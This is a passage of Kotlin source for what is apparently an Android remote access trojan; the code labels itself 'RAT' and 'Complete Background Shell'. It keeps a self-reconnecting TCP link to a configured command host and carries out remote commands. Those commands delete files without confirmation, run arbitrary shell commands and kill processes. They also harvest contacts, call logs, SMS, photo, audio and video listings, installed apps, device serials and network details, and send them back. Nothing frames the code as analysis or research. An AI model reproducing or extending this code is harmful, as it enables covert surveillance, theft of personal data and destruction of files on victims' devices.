            }

            Log.d(TAG, "Delete request for: ${file.absolutePath}")

            if (!file.exists()) {
                return "File/directory not found: ${file.absolutePath}"
            }

            val originalSize = if (file.isFile) file.length() else calculateTotalSize(file)
            val itemType = if (file.isDirectory) "directory" else "file"
            val itemCount = if (file.isDirectory) countItems(file) else 1

            // Just delete it - no restrictions, no confirmations
            val success = if (file.isDirectory) {
                deleteRecursiveSimple(file)
            } else {
                file.delete()
            }

            if (success) {
                "SUCCESS: Deleted $itemType '${file.name}'\n" +
                        "Path: ${file.absolutePath}\n" +
                        "Items removed: $itemCount\n" +
                        "Space freed: ${formatFileSize(originalSize)}"
            } else {
                "FAILED: Could not delete ${file.absolutePath}\n" +
                        "Reason: Permission denied or file in use"
            }

        } catch (e: Exception) {
            "ERROR: Delete failed - ${e.message}"
        }
    }

    // Simple recursive delete - just works
    private fun deleteRecursiveSimple(directory: File): Boolean {
        return try {
            var allDeleted = true

            // Get all files and directories
            directory.walkBottomUp().forEach { file ->
                try {
                    if (!file.delete()) {
                        allDeleted = false
                        Log.w(TAG, "Failed to delete: ${file.absolutePath}")
                    }
                } catch (e: Exception) {
                    allDeleted = false
                    Log.w(TAG, "Exception deleting ${file.absolutePath}: ${e.message}")
                }
            }

            allDeleted
        } catch (e: Exception) {
            false
        }
    }

    // Quick size calculation
    private fun calculateTotalSize(directory: File): Long {
        return try {
            var totalSize = 0L
            directory.walkTopDown().forEach { file ->
                if (file.isFile) {
                    totalSize += file.length()
                }
            }
            totalSize
        } catch (e: Exception) {
            0L
        }
    }

    // Quick item count
    private fun countItems(directory: File): Int {
        return try {
            directory.walkTopDown().count()
        } catch (e: Exception) {
            1
        }
    }

    // Enhanced delete with pattern support (bonus feature)
    private fun deleteWithPattern(pattern: String, directory: String = currentDirectory): String {
        return try {
            val dir = File(directory)
            val files = dir.listFiles() ?: return "Cannot read directory: $directory"

            // Convert shell pattern to regex
            val regex = pattern
                .replace(".", "\\.")
                .replace("*", ".*")
                .replace("?", ".")
                .toRegex(RegexOption.IGNORE_CASE)

            val matchingFiles = files.filter { regex.matches(it.name) }

            if (matchingFiles.isEmpty()) {
                return "No files match pattern '$pattern' in $directory"
            }

            var deleted = 0
            var failed = 0
            var totalSize = 0L

            matchingFiles.forEach { file ->
                try {
                    val size = if (file.isFile) file.length() else calculateTotalSize(file)
                    val success = if (file.isDirectory) {
                        deleteRecursiveSimple(file)
                    } else {
                        file.delete()
                    }

                    if (success) {
                        deleted++
                        totalSize += size
                    } else {
                        failed++
                    }
                } catch (e: Exception) {
                    failed++
                }
            }

            "PATTERN DELETE COMPLETE:\n" +
                    "Pattern: '$pattern'\n" +
                    "Location: $directory\n" +
                    "Found: ${matchingFiles.size} items\n" +
                    "Deleted: $deleted items\n" +
                    "Failed: $failed items\n" +
                    "Space freed: ${formatFileSize(totalSize)}"

        } catch (e: Exception) {
            "Pattern delete error: ${e.message}"
        }
    }

    // BONUS: Advanced delete command processor (optional)
    private suspend fun processAdvancedDelete(command: String, socket: Socket) {
        val parts = command.split(" ")

        when {
            // Basic delete
            parts.size == 2 -> {
                val result = deletePathSimple(parts[1])
                sendResponse(result, socket)
            }

            // Pattern delete: delete pattern *.txt
            parts.size == 3 && parts[1] == "pattern" -> {
                val result = deleteWithPattern(parts[2])
                sendResponse(result, socket)
            }

            // Delete in specific directory: delete in /path *.log
            parts.size == 4 && parts[1] == "in" -> {
                val result = deleteWithPattern(parts[3], parts[2])
                sendResponse(result, socket)
            }

            // Show what would be deleted: delete show /path
            parts.size == 3 && parts[1] == "show" -> {
                val result = showDeletePreview(parts[2])
                sendResponse(result, socket)
            }

            else -> {
                sendResponse("Usage:\n" +
                        "delete <path>              --> Delete file or directory\n" +
                        "delete pattern *.ext       --> Delete files matching pattern\n" +
                        "delete in /path *.log      --> Delete pattern in specific directory\n" +
                        "delete show <path>         --> Preview what would be deleted", socket)
            }
        }
    }

    // Quick preview function
    private fun showDeletePreview(path: String): String {
        return try {
            val file = if (path.startsWith("/")) File(path) else File(currentDirectory, path)

            if (!file.exists()) {
                return "Path not found: ${file.absolutePath}"
            }

            if (file.isFile) {
                "WOULD DELETE FILE:\n" +
                        "Name: ${file.name}\n" +
                        "Path: ${file.absolutePath}\n" +
                        "Size: ${formatFileSize(file.length())}\n" +
                        "Modified: ${SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(file.lastModified()))}"
            } else {
                val itemCount = countItems(file)
                val totalSize = calculateTotalSize(file)

                "WOULD DELETE DIRECTORY:\n" +
                        "Name: ${file.name}\n" +
                        "Path: ${file.absolutePath}\n" +
                        "Contains: $itemCount items\n" +
                        "Total size: ${formatFileSize(totalSize)}\n" +
                        "Modified: ${SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(file.lastModified()))}"
            }

        } catch (e: Exception) {
            "Preview error: ${e.message}"
        }
    }
    private fun createDirectory(dirPath: String): String {
        return try {
            val dir = File(dirPath)
            if (dir.exists()) {
                return "Directory already exists: $dirPath"
            }

            if (dir.mkdirs()) {
                "Directory created successfully: $dirPath"
            } else {
                "Failed to create directory: $dirPath"
            }
        } catch (e: Exception) {
            "Error creating directory: ${e.message}"
        }
    }

    // === SYSTEM OPERATIONS IMPLEMENTATION ===

    private fun getRunningProcesses(): String {
        return try {
            val result = StringBuilder()
            result.append("=== RUNNING PROCESSES ===\n\n")

            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val processes = activityManager.runningAppProcesses

            if (processes != null) {
                for (process in processes) {
                    result.append("PID: ${process.pid}\n")
                    result.append("Name: ${process.processName}\n")
                    result.append("Importance: ${getImportanceString(process.importance)}\n")
                    result.append("UID: ${process.uid}\n")
                    result.append("\n")
                }
            }

            // Also try to get system processes via shell
            try {
                val shellResult = executeShellCommand("ps")
                if (shellResult.isNotEmpty()) {
                    result.append("\n=== SYSTEM PROCESSES (via shell) ===\n")
                    result.append(shellResult)
                }
            } catch (e: Exception) {
                // Shell access might not work
            }

            result.toString()

        } catch (e: Exception) {
            "Error getting processes: ${e.message}"
        }
    }

    private fun killProcess(processName: String): String {
        return try {
            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val processes = activityManager.runningAppProcesses

            var killed = false
            for (process in processes) {
                if (process.processName.contains(processName, ignoreCase = true)) {
                    try {
                        android.os.Process.killProcess(process.pid)
                        killed = true
                    } catch (e: Exception) {
                        // Process might not be killable
                    }
                }
            }

            if (killed) {
                "Process killed: $processName"
            } else {
                "Process not found or cannot be killed: $processName"
            }

        } catch (e: Exception) {
            "Error killing process: ${e.message}"
        }
    }

    private fun executeShellCommand(command: String): String {
        return try {
            val process = Runtime.getRuntime().exec(command)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = StringBuilder()

            var line: String?
            while (reader.readLine().also { line = it } != null) {
                output.append(line).append("\n")
            }

            val errorReader = BufferedReader(InputStreamReader(process.errorStream))
            var errorLine: String?
            while (errorReader.readLine().also { errorLine = it } != null) {
                output.append("ERROR: ").append(errorLine).append("\n")
            }

            process.waitFor()
            reader.close()
            errorReader.close()

            if (output.isEmpty()) {
                "Command executed (no output)"
            } else {
                output.toString()
            }

        } catch (e: Exception) {
            "Error executing command: ${e.message}"
        }
    }

    private fun pingHost(host: String): String {
        return try {
            val command = "ping -c 4 $host"
            executeShellCommand(command)
        } catch (e: Exception) {
            "Error pinging host: ${e.message}"
        }
    }

    // === DATA ACCESS IMPLEMENTATION ===

    private fun getContactsData(): String {
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied: READ_CONTACTS required\n"
            }

            val result = StringBuilder()
            result.append("=== CONTACTS ===\n\n")

            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )

            cursor?.use { c ->
                if (c.moveToFirst()) {
                    var count = 0
                    do {
                        val name = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) ?: "Unknown"
                        val phone = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: "Unknown"
                        val type = c.getInt(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE))

                        result.append("#$count\n")
                        result.append("Name: $name\n")
                        result.append("Phone: $phone\n")
                        result.append("Type: ${getPhoneTypeString(type)}\n")
                        result.append("\n")

                        count++
                        if (count >= 50) {
                            result.append("... (showing first 50 contacts)")
                            break
                        }
                    } while (c.moveToNext())
                } else {
                    result.append("No contacts found")
                }
            }

            result.toString()
        } catch (e: Exception) {
            "Error reading contacts: ${e.message}\n"
        }
    }

    private fun getInstalledApps(): String {
        return try {
            val result = StringBuilder()
            result.append("=== INSTALLED APPLICATIONS ===\n\n")

            val packageManager = context.packageManager
            val packages = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)

            val sortedPackages = packages.sortedBy { it.loadLabel(packageManager).toString() }

            for ((index, app) in sortedPackages.withIndex()) {
                val appName = app.loadLabel(packageManager).toString()
                val packageName = app.packageName
                val isSystemApp = (app.flags and ApplicationInfo.FLAG_SYSTEM) != 0

                try {
                    val packageInfo = packageManager.getPackageInfo(packageName, 0)
                    val version = packageInfo.versionName ?: "Unknown"
                    val installTime = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date(packageInfo.firstInstallTime))

                    result.append("#$index\n")
                    result.append("Name: $appName\n")
                    result.append("Package: $packageName\n")
                    result.append("Version: $version\n")
                    result.append("Type: ${if (isSystemApp) "System" else "User"}\n")
                    result.append("Installed: $installTime\n")
                    result.append("\n")

                    if (index >= 100) {
                        result.append("... (showing first 100 apps)")
                        break
                    }
                } catch (e: Exception) {
                    // Skip apps that can't be queried
                }
            }

            result.toString()
        } catch (e: Exception) {
            "Error getting installed apps: ${e.message}\n"
        }
    }

    // === MEDIA ACCESS IMPLEMENTATION ===

    private fun getPhotosInfo(): String {
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied: READ_EXTERNAL_STORAGE required\n"
            }

            val result = StringBuilder()
            result.append("=== PHOTOS INFORMATION ===\n\n")

            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATE_TAKEN,
                MediaStore.Images.Media.DATA
            )

            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Images.Media.DATE_TAKEN + " DESC"
            )

            cursor?.use { c ->
                if (c.moveToFirst()) {
                    var count = 0
                    do {
                        val name = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)) ?: "Unknown"
                        val size = c.getLong(c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE))
                        val dateTaken = c.getLong(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))
                        val path = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)) ?: "Unknown"

                        val dateStr = if (dateTaken > 0) {
                            SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(dateTaken))
                        } else "Unknown"

                        result.append("#$count\n")
                        result.append("Name: $name\n")
                        result.append("Size: ${formatFileSize(size)}\n")
                        result.append("Date: $dateStr\n")
                        result.append("Path: $path\n")
                        result.append("\n")

                        count++
                        if (count >= 20) {
                            result.append("... (showing first 20 photos)")
                            break
                        }
                    } while (c.moveToNext())
                } else {
                    result.append("No photos found")
                }
            }

            result.toString()
        } catch (e: Exception) {
            "Error getting photos info: ${e.message}\n"
        }
    }

    private fun getAudioInfo(): String {
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied: READ_EXTERNAL_STORAGE required\n"
            }

            val result = StringBuilder()
            result.append("=== AUDIO FILES INFORMATION ===\n\n")

            val projection = arrayOf(
                MediaStore.Audio.Media._ID,
                MediaStore.Audio.Media.DISPLAY_NAME,
                MediaStore.Audio.Media.SIZE,
                MediaStore.Audio.Media.DURATION,
                MediaStore.Audio.Media.ARTIST,
                MediaStore.Audio.Media.DATA
            )

            val cursor = context.contentResolver.query(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Audio.Media.DISPLAY_NAME + " ASC"
            )

            cursor?.use { c ->
                if (c.moveToFirst()) {
                    var count = 0
                    do {
                        val name = c.getString(c.getColumnIndexOrThrow(MediaStore.Audio.Media.DISPLAY_NAME)) ?: "Unknown"
                        val size = c.getLong(c.getColumnIndexOrThrow(MediaStore.Audio.Media.SIZE))
                        val duration = c.getLong(c.getColumnIndexOrThrow(MediaStore.Audio.Media.DURATION))
                        val artist = c.getString(c.getColumnIndexOrThrow(MediaStore.Audio.Media.ARTIST)) ?: "Unknown"
                        val path = c.getString(c.getColumnIndexOrThrow(MediaStore.Audio.Media.DATA)) ?: "Unknown"

                        val durationStr = if (duration > 0) {
                            val minutes = duration / 1000 / 60
                            val seconds = (duration / 1000) % 60
                            String.format("%02d:%02d", minutes, seconds)
                        } else "Unknown"

                        result.append("#$count\n")
                        result.append("Name: $name\n")
                        result.append("Artist: $artist\n")
                        result.append("Duration: $durationStr\n")
                        result.append("Size: ${formatFileSize(size)}\n")
                        result.append("Path: $path\n")
                        result.append("\n")

                        count++
                        if (count >= 20) {
                            result.append("... (showing first 20 audio files)")
                            break
                        }
                    } while (c.moveToNext())
                } else {
                    result.append("No audio files found")
                }
            }

            result.toString()
        } catch (e: Exception) {
            "Error getting audio info: ${e.message}\n"
        }
    }

    private fun getVideosInfo(): String {
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied: READ_EXTERNAL_STORAGE required\n"
            }

            val result = StringBuilder()
            result.append("=== VIDEO FILES INFORMATION ===\n\n")

            val projection = arrayOf(
                MediaStore.Video.Media._ID,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.DURATION,
                MediaStore.Video.Media.DATE_TAKEN,
                MediaStore.Video.Media.DATA
            )

            val cursor = context.contentResolver.query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Video.Media.DATE_TAKEN + " DESC"
            )

            cursor?.use { c ->
                if (c.moveToFirst()) {
                    var count = 0
                    do {
                        val name = c.getString(c.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)) ?: "Unknown"
                        val size = c.getLong(c.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE))
                        val duration = c.getLong(c.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION))
                        val dateTaken = c.getLong(c.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_TAKEN))
                        val path = c.getString(c.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)) ?: "Unknown"

                        val durationStr = if (duration > 0) {
                            val minutes = duration / 1000 / 60
                            val seconds = (duration / 1000) % 60
                            String.format("%02d:%02d", minutes, seconds)
                        } else "Unknown"

                        val dateStr = if (dateTaken > 0) {
                            SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(dateTaken))
                        } else "Unknown"

                        result.append("#$count\n")
                        result.append("Name: $name\n")
                        result.append("Duration: $durationStr\n")
                        result.append("Size: ${formatFileSize(size)}\n")
                        result.append("Date: $dateStr\n")
                        result.append("Path: $path\n")
                        result.append("\n")

                        count++
                        if (count >= 20) {
                            result.append("... (showing first 20 video files)")
                            break
                        }
                    } while (c.moveToNext())
                } else {
                    result.append("No video files found")
                }
            }

            result.toString()
        } catch (e: Exception) {
            "Error getting videos info: ${e.message}\n"
        }
    }

    // === SYSTEM INFO IMPLEMENTATION ===

    private fun getSystemInfo(): String {
        return try {
            val result = StringBuilder()
            result.append("=== SYSTEM INFORMATION ===\n\n")

            // Memory Info
            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memoryInfo = ActivityManager.MemoryInfo()
            activityManager.getMemoryInfo(memoryInfo)

            result.append("Memory:\n")
            result.append("  Available: ${formatFileSize(memoryInfo.availMem)}\n")
            result.append("  Total: ${formatFileSize(memoryInfo.totalMem)}\n")
            result.append("  Low Memory: ${memoryInfo.lowMemory}\n")
            result.append("  Threshold: ${formatFileSize(memoryInfo.threshold)}\n\n")

            // Storage Info
            try {
                val internalStats = StatFs(Environment.getDataDirectory().path)
                val externalStats = if (Environment.getExternalStorageState() == Environment.MEDIA_MOUNTED) {
                    StatFs(Environment.getExternalStorageDirectory().path)
                } else null

                result.append("Storage:\n")
                result.append("  Internal Total: ${formatFileSize(internalStats.totalBytes)}\n")
                result.append("  Internal Available: ${formatFileSize(internalStats.availableBytes)}\n")

                if (externalStats != null) {
                    result.append("  External Total: ${formatFileSize(externalStats.totalBytes)}\n")
                    result.append("  External Available: ${formatFileSize(externalStats.availableBytes)}\n")
                } else {
                    result.append("  External Storage: Not available\n")
                }
                result.append("\n")
            } catch (e: Exception) {
                result.append("Storage: Error getting storage info\n\n")
            }

            // CPU Info
            try {
                val cpuInfo = executeShellCommand("cat /proc/cpuinfo")
                if (cpuInfo.isNotEmpty()) {
                    result.append("CPU Info:\n")
                    val lines = cpuInfo.split("\n").take(10) // First 10 lines
                    for (line in lines) {
                        if (line.trim().isNotEmpty()) {
                            result.append("  $line\n")
                        }
                    }
                    result.append("\n")
                }
            } catch (e: Exception) {
                result.append("CPU Info: Not available\n\n")
            }

            // System Uptime
            try {
                val uptimeInfo = executeShellCommand("cat /proc/uptime")
                if (uptimeInfo.isNotEmpty()) {
                    val uptime = uptimeInfo.split(" ")[0].toDoubleOrNull()
                    if (uptime != null) {
                        val hours = (uptime / 3600).toInt()
                        val minutes = ((uptime % 3600) / 60).toInt()
                        result.append("System Uptime: ${hours}h ${minutes}m\n\n")
                    }
                }
            } catch (e: Exception) {
                // Ignore
            }

            result.toString()
        } catch (e: Exception) {
            "Error getting system info: ${e.message}\n"
        }
    }

    private fun getNetworkConnections(): String {
        return try {
            val result = StringBuilder()
            result.append("=== NETWORK CONNECTIONS ===\n\n")

            // Get network interfaces
            val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())

            result.append("Network Interfaces:\n")
            for (intf in interfaces) {
                if (intf.isUp) {
                    result.append("  ${intf.name}: ${intf.displayName}\n")
                    val addresses = Collections.list(intf.inetAddresses)
                    for (addr in addresses) {
                        if (!addr.isLoopbackAddress) {
                            result.append("    ${addr.hostAddress}\n")
                        }
                    }
                }
            }
            result.append("\n")

            // Try to get active connections via shell
            try {
                val netstatOutput = executeShellCommand("netstat -an")
                if (netstatOutput.isNotEmpty()) {
                    result.append("Active Connections:\n")
                    val lines = netstatOutput.split("\n").take(20) // First 20 lines
                    for (line in lines) {
                        if (line.trim().isNotEmpty()) {
                            result.append("  $line\n")
                        }
                    }
                }
            } catch (e: Exception) {
                result.append("Active Connections: Shell access not available\n")
            }

            result.toString()
        } catch (e: Exception) {
            "Error getting network connections: ${e.message}\n"
        }
    }

    // === CLIPBOARD OPERATIONS ===

    private fun setClipboardData(text: String): String {
        return try {
            val clipboardManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clipData = android.content.ClipData.newPlainText("RAT", text)
            clipboardManager.setPrimaryClip(clipData)
            "Clipboard set successfully"
        } catch (e: Exception) {
            "Error setting clipboard: ${e.message}"
        }
    }

    // === UTILITY FUNCTIONS ===

    private fun formatFileSize(bytes: Long): String {
        val units = arrayOf("B", "KB", "MB", "GB", "TB")
        var size = bytes.toDouble()
        var unitIndex = 0

        while (size >= 1024 && unitIndex < units.size - 1) {
            size /= 1024
            unitIndex++
        }

        return String.format("%.2f %s", size, units[unitIndex])
    }

    private fun getFilePermissions(file: File): String {
        val permissions = StringBuilder()
        permissions.append(if (file.canRead()) "r" else "-")
        permissions.append(if (file.canWrite()) "w" else "-")
        permissions.append(if (file.canExecute()) "x" else "-")
        return permissions.toString()
    }

    private fun getImportanceString(importance: Int): String {
        return when (importance) {
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND -> "Foreground"
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_BACKGROUND -> "Background"
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_SERVICE -> "Service"
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_VISIBLE -> "Visible"
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_PERCEPTIBLE -> "Perceptible"
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_CANT_SAVE_STATE -> "Can't Save State"
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_EMPTY -> "Empty"
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_GONE -> "Gone"
            else -> "Unknown ($importance)"
        }
    }

    private fun getPhoneTypeString(type: Int): String {
        return when (type) {
            ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"
            ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"
            ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"
            ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK -> "Work Fax"
            ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME -> "Home Fax"
            ContactsContract.CommonDataKinds.Phone.TYPE_PAGER -> "Pager"
            ContactsContract.CommonDataKinds.Phone.TYPE_OTHER -> "Other"
            ContactsContract.CommonDataKinds.Phone.TYPE_CUSTOM -> "Custom"
            ContactsContract.CommonDataKinds.Phone.TYPE_MAIN -> "Main"
            ContactsContract.CommonDataKinds.Phone.TYPE_WORK_MOBILE -> "Work Mobile"
            else -> "Unknown"
        }
    }

    // === EXISTING METHODS (Enhanced) ===

    private fun isSocketAlive(socket: Socket): Boolean {
        return try {
            socket.isConnected && !socket.isClosed && !socket.isInputShutdown && !socket.isOutputShutdown
        } catch (e: Exception) {
            false
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = connectivityManager.activeNetwork ?: return false
                val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
                val hasInternet = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                val hasValidated = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                hasInternet && hasValidated
            } else {
                @Suppress("DEPRECATION")
                val networkInfo = connectivityManager.activeNetworkInfo
                networkInfo != null && networkInfo.isConnected
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking network: ${e.message}")
            false
        }
    }

// COMPLETE FIXED sendResponse method - Replace in BackgroundTcpManager.kt
// CORRECTED sendResponse method - Replace in BackgroundTcpManager.kt

    private suspend fun sendResponse(message: String, socket: Socket) {
        try {
            if (!isSocketAlive(socket)) {
                Log.d(TAG, "Socket not alive, cannot send response")
                return
            }

            val responseData = buildString {
                append(message)
                if (!message.endsWith("\n")) append("\n")
                append("END123\n")
            }.toByteArray(Charsets.UTF_8)

            withContext(Dispatchers.IO) {
                synchronized(outputStream) {  // FIXED: Only synchronize the actual write operation
                    try {
                        outputStream.write(responseData)
                        outputStream.flush()

                        Log.d(TAG, "Response sent: ${message.take(50)}...")

                    } catch (e: IOException) {
                        Log.e(TAG, "IO error sending response: ${e.message}")
                        throw e
                    }
                }

                // FIXED: Delay OUTSIDE the synchronized block
                delay(50)
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error sending response: ${e.message}")
        }
    }
    private suspend fun scheduleReconnect() {
        synchronized(connectionLock) {
            if (isReconnecting) {
                Log.d(TAG, "Reconnection already in progress")
                return
            }

            if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
                Log.d(TAG, "Max reconnection attempts reached, resetting")
                reconnectAttempts = 0
            }

            isReconnecting = true
            reconnectAttempts++
        }

        val backoffDelay = (BASE_RECONNECT_DELAY * reconnectAttempts).coerceAtMost(60000L)
        val jitter = (1000..3000).random()
        val totalDelay = backoffDelay + jitter

        Log.d(TAG, "Scheduling reconnection #$reconnectAttempts in ${totalDelay}ms")

        delay(totalDelay)

        synchronized(connectionLock) {
            isReconnecting = false
        }

        execute(Config.IP, Config.PORT)
    }

    private fun cleanup() {
        try {
            // Cancel jobs
            connectionJob?.cancel()

            // Close socket
            currentSocket?.close()
            currentSocket = null

            isVideoRecording = false
            mediaRecorderVideo?.release()
            mediaRecorderVideo = null
            videoFile?.delete()
            videoFile = null

            // Clean up audio recording
            synchronized(recordingLock) {
                if (isRecording) {
                    try {
                        mediaRecorder?.stop()
                    } catch (e: Exception) {
                        Log.w(TAG, "Error stopping media recorder during cleanup: ${e.message}")
                    }
                    mediaRecorder?.release()
                    mediaRecorder = null
                    isRecording = false
                }

                // Clean up audio file
                audioFile?.let { file ->
                    if (file.exists()) {
                        try {
                            file.delete()
                        } catch (e: Exception) {
                            Log.w(TAG, "Error deleting audio file during cleanup: ${e.message}")
                        }
                    }
                }
                audioFile = null
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error during cleanup: ${e.message}")
        }
    }

    // === ORIGINAL DATA METHODS (Enhanced) ===

    private fun getDeviceInfo(): String {
        return try {
            val result = StringBuilder()
            result.append("=== DEVICE INFORMATION ===\n\n")

            // Hardware info
            result.append("Hardware:\n")
            result.append("  Model: ${Build.MODEL}\n")
            result.append("  Manufacturer: ${Build.MANUFACTURER}\n")
            result.append("  Brand: ${Build.BRAND}\n")
            result.append("  Device: ${Build.DEVICE}\n")
            result.append("  Product: ${Build.PRODUCT}\n")
            result.append("  Board: ${Build.BOARD}\n")
            result.append("  Hardware: ${Build.HARDWARE}\n")

            // System info
            result.append("\nSystem:\n")
            result.append("  Android: ${Build.VERSION.RELEASE}\n")
            result.append("  API Level: ${Build.VERSION.SDK_INT}\n")
            result.append("  Fingerprint: ${Build.FINGERPRINT}\n")

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                result.append("  Security Patch: ${Build.VERSION.SECURITY_PATCH}\n")
            }

            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    result.append("  Serial: ${Build.getSerial()}\n")
                } else {
                    @Suppress("DEPRECATION")
                    result.append("  Serial: ${Build.SERIAL}\n")
                }
            } catch (e: Exception) {
                result.append("  Serial: Not accessible\n")
            }

            // Build info
            result.append("\nBuild:\n")
            result.append("  ID: ${Build.ID}\n")
            result.append("  Display: ${Build.DISPLAY}\n")
            result.append("  Host: ${Build.HOST}\n")
            result.append("  User: ${Build.USER}\n")
            result.append("  Type: ${Build.TYPE}\n")
            result.append("  Tags: ${Build.TAGS}\n")

            result.append("\nMode: Complete Background Shell\n")

            return result.toString()

        } catch (e: Exception) {
            "Device info error: ${e.message}"
        }
    }

    private fun getCallLogsData(): String {
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied: READ_CALL_LOG required\n"
            }

            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                "${CallLog.Calls.DATE} DESC"
            )

            val result = StringBuilder()
            result.appendLine("=== CALL LOGS ===")
            result.appendLine()

            cursor?.use { c ->
                if (c.moveToFirst()) {
                    result.appendLine("Total calls: ${c.count}")
                    result.appendLine()

                    var count = 0
                    do {
                        val number = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "Unknown"
                        val name = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: "Unknown"
                        val duration = c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                        val type = c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                        val date = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE))

                        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                        val formattedDate = dateFormat.format(Date(date))

                        val callType = when (type) {
                            CallLog.Calls.INCOMING_TYPE -> "Incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                            CallLog.Calls.MISSED_TYPE -> "Missed"
                            CallLog.Calls.VOICEMAIL_TYPE -> "Voicemail"
                            CallLog.Calls.REJECTED_TYPE -> "Rejected"
                            CallLog.Calls.BLOCKED_TYPE -> "Blocked"
                            else -> "Unknown"
                        }

                        val formattedDuration = if (duration > 0) {
                            val minutes = duration / 60
                            val seconds = duration % 60
                            String.format("%02d:%02d", minutes, seconds)
                        } else "00:00"

                        result.appendLine("#$count")
                        result.appendLine("Number: $number")
                        result.appendLine("Name: $name")
                        result.appendLine("Type: $callType")
                        result.appendLine("Date: $formattedDate")
                        result.appendLine("Duration: $formattedDuration")
                        result.appendLine()

                        count++
                        if (count >= 50) {
                            result.appendLine("... (showing first 50 calls)")
                            break
                        }
                    } while (c.moveToNext())
                } else {
                    result.appendLine("No call logs found")
                }
            }
            result.toString()
        } catch (e: Exception) {
            "Error reading call logs: ${e.message}\n"
        }
    }

    private fun getSMSData(type: String): String {
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied: READ_SMS required\n"
            }

